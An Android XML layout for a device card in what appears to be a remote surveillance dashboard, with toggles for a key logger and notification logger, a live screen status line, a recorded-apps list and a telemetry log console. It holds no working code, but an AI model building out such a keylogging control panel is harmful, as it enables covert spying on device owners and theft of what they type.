<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"
    android:background="@drawable/card_background"
    android:padding="16dp"
    android:layout_marginBottom="16dp">

    <!-- Device Header (Clickable to expand/collapse logs) -->
    <LinearLayout
        android:id="@+id/layoutDeviceHeader"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:gravity="center_vertical"
        android:layout_marginBottom="12dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="📱"
            android:textSize="20sp"
            android:layout_marginRight="10dp" />

        <LinearLayout
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical">

            <TextView
                android:id="@+id/txtDeviceName"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Device Identifier"
                android:textSize="16sp"
                android:textStyle="bold"
                android:textColor="#F1F5F9"
                android:fontFamily="monospace" />

            <TextView
                android:id="@+id/txtDeviceSub"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Tap to expand/collapse logs"
                android:textSize="11sp"
                android:textColor="#38BDF8" />
        </LinearLayout>

        <TextView
            android:id="@+id/txtPresencePill"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="ONLINE"
            android:textSize="10sp"
            android:textStyle="bold"
            android:textColor="#22C55E"
            android:background="@drawable/online_pill_background"
            android:paddingLeft="8dp"
            android:paddingRight="8dp"
            android:paddingTop="4dp"
            android:paddingBottom="4dp" />
    </LinearLayout>

    <!-- Remote-Control Buttons -->
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:layout_marginBottom="12dp">

        <Button
            android:id="@+id/btnToggleKeyLog"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Key Logger: ON"
            android:textSize="11sp"
            android:textStyle="bold"
            android:background="@drawable/btn_green_rounded"
            android:textColor="#FFFFFF"
            android:layout_marginRight="6dp" />

        <Button
            android:id="@+id/btnToggleNotifLog"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Notif Logger: ON"
            android:textSize="11sp"
            android:textStyle="bold"
            android:background="@drawable/btn_green_rounded"
            android:textColor="#FFFFFF"
            android:layout_marginLeft="6dp" />
    </LinearLayout>

    <!-- Live Screen State View -->
    <TextView
        android:id="@+id/txtLiveScreenState"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Live Screen: Waiting..."
        android:textSize="11sp"
        android:textColor="#3FB950"
        android:fontFamily="monospace"
        android:layout_marginBottom="8dp" />

    <!-- Collapsible Log Container (Hidden by default to prevent lag) -->
    <LinearLayout
        android:id="@+id/layoutLogContainer"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:visibility="gone">

        <!-- Per-Device All Recorded Apps Tile -->
        <TextView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="ALL RECORDED APPS (Tap to Filter):"
            android:textStyle="bold"
            android:textSize="11sp"
            android:textColor="#94A3B8"
            android:fontFamily="monospace"
            android:layout_marginBottom="4dp" />

        <ScrollView
            android:id="@+id/appsScrollView"
            android:layout_width="match_parent"
            android:layout_height="220dp"
            android:background="#0A0F1D"
            android:padding="8dp"
            android:layout_marginBottom="12dp"
            android:fillViewport="false">

            <LinearLayout
                android:id="@+id/containerDeviceAppsToday"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical" />
        </ScrollView>

        <!-- Filter Header & Back to All Logs Button -->
        <LinearLayout
            android:id="@+id/layoutFilterHeader"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal"
            android:gravity="center_vertical"
            android:layout_marginBottom="4dp"
            android:visibility="gone">

            <TextView
                android:id="@+id/txtActiveFilter"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="Filtering: App"
                android:textSize="11sp"
                android:textStyle="bold"
                android:textColor="#38BDF8"
                android:fontFamily="monospace" />

            <Button
                android:id="@+id/btnBackToAll"
                android:layout_width="wrap_content"
                android:layout_height="28dp"
                android:text="Back to All Logs"
                android:textSize="9sp"
                android:textStyle="bold"
                android:background="@drawable/btn_blue_rounded"
                android:textColor="#FFFFFF" />
        </LinearLayout>

        <!-- Terminal-style Log Panel -->
        <TextView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="INDIVIDUAL TELEMETRY FEED:"
            android:textStyle="bold"
            android:textSize="11sp"
            android:textColor="#94A3B8"
            android:fontFamily="monospace"
            android:layout_marginBottom="6dp" />

        <ScrollView
            android:id="@+id/logScrollView"
            android:layout_width="match_parent"
            android:layout_height="260dp"
            android:background="#0A0F1D"
            android:padding="10dp"
            android:fillViewport="false">

            <TextView
                android:id="@+id/txtDeviceLogConsole"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Waiting for device activity..."
                android:textSize="11sp"
                android:textColor="#38BDF8"
                android:fontFamily="monospace" />
        </ScrollView>
    </LinearLayout>

</LinearLayout>
